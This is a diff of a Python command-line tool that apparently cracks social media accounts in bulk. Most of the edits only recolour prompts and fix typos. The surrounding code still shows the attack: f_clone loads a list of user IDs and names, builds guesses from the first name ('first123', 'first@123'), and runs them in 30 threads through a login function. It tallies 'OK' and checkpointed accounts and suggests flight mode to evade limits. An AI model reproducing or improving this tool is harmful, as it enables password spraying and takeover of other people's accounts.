@@ -900,7 +900,7 @@ def linex():
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
 def SUMON_time():
-    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] Device    : {manufacturer_name}-android-v-{android_version}")
+    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] Device     : {manufacturer_name}-android-v-{android_version}")
     print(f"\033[1;32m[\033[1;31m✓\033[1;32m] location   : {current_city}-{current_country} ")
     print(f"\033[1;32m[\033[1;31m✓\033[1;32m] Date       : {datex} ")
     linex()
@@ -916,7 +916,7 @@ def menu():
     print("[5] CONTACT (WHATSAPP) ")
     print("[6] EXIT TOOL ")
     linex()
-    bithi = input(f"\033[1;32m[\033[1;31m✓\033[1;32m]CHOOSE =>")
+    bithi = input(f"\033[1;32m[\033[1;31m✓\033[1;32m] CHOOSE =>")
     if bithi =='1':f_clone()
     elif bithi =='2':r_clone()
     elif bithi =='3':n_clone()
@@ -930,13 +930,13 @@ def menu():
 
 def f_clone():
     clear()
-    print(" [â¢] EXAMPLE : /sdcard/file.txt ")
+    print("\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : /sdcard/file.txt ")
     linex()
-    file_x = input(" [â¢] Enter FILE PATH : ")
+    file_x = input("\033[1;32m[\033[1;31m✓\033[1;32m] Enter FILE PATH : ")
     try:
         file_idz = open(file_x, "r").read().splitlines()
     except:
-        exit(" [â¢] FILE NOT FOUND ")
+        exit("\033[1;32m[\033[1;31m✓\033[1;32m] FILE NOT FOUND ")
     for x in file_idz:
         idz.append(x)
     clear()
@@ -949,7 +949,7 @@ def f_clone():
    #print(" [1] CRACK WITH AUTO PASS ")
     print(" [2] CRACK WITH MANUAL PASS ")
     linex()
-    p = input(" [â¢] SELECT : ")
+    p = input("\033[1;32m[\033[1;31m✓\033[1;32m] SELECT : ")
     if p == "1":
         plist.append("first123")
         plist.append("first@123")
@@ -961,11 +961,11 @@ def f_clone():
         plist.append("first@12")
     else:
         clear()
-        print(" [â¢] MAXIMUM LIMIT : (10) ")
+        print("\033[1;32m[\033[1;31m✓\033[1;32m] MAXIMUM LIMIT : (10) ")
         linex()
-        plimit = int(input(" [â¢] ENTER PASSWORD LIMIT : "))
+        plimit = int(input("\033[1;32m[\033[1;31m✓\033[1;32m] ENTER PASSWORD LIMIT : "))
         clear()
-        print(" [â¢] EXAMPLE : first123, first1234, first12345 ")
+        print("\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : first123, first1234, first12345 ")
         linex()
         for SUMON in range(plimit):
             ap = input(f" [{SUMON+1}] ENTER PASSWORD : ")
@@ -973,9 +973,9 @@ def f_clone():
     with ThreadPool(max_workers=30) as SUMON_xd:
         clear()
         tl = str(len(idz))
-        print(" [â¢] TOTAL ACCOUNTS : "+tl)
-        print(" [â¢] PROCESS HAS BEEN STARTED ")
-        print(" [â¢] USE FLIGHT MODE FOR MORE OK IDZ ")
+        print("\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ACCOUNTS : "+tl)
+        print("\033[1;32m[\033[1;31m✓\033[1;32m] PROCESS HAS BEEN STARTED ")
+        print("\033[1;32m[\033[1;31m✓\033[1;32m] USE FLIGHT MODE FOR MORE OK IDZ ")
         linex()
         for love in idz:
             uid, name = love.split("|")
@@ -986,11 +986,11 @@ def f_clone():
             else:
                 SUMON_xd.submit(graph, uid, name, pwx, tl)
     linex()
-    print(" [â¢] PROCESS HAS BEEN COMPLETED ")
-    print(" [â¢] TOTAL OK ACCOUNTS : "+str(len(oks)))
-    print(" [â¢] TOTAL CP ACCOUNTS : "+str(len(cps)))
+    print("\033[1;32m[\033[1;31m✓\033[1;32m] PROCESS HAS BEEN COMPLETED ")
+    print("\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ACCOUNTS : "+str(len(oks)))
+    print("\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ACCOUNTS : "+str(len(cps)))
     linex()
-    input(" [â¢] PRESS ENTER TO EXIT TOOL ")
+    input("\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO EXIT TOOL ")
     exit()
 
 def r_clone():
@@ -1000,10 +1000,10 @@ def r_clone():
     print(" [2] INDIA RONDAM")
     print(" [3] NEPAL RAODOM")
     print(" [4] BAGLADESH RONDAM")
-    print(" [5] RONDAM 4 CHOICE PASS")
+    print(" [5] RANDOM CHOICE PASS")
     print(" [6] GAMING CLONE")
     linex()
-    bithi = input("âCHOOSE> ")
+    bithi = input("\033[1;32m[\033[1;31m✓\033[1;32m] CHOOSE => ")
     if bithi =='1':SUMON1()
     elif bithi =='2':SUMON2()
     elif bithi =='3':SUMON3()
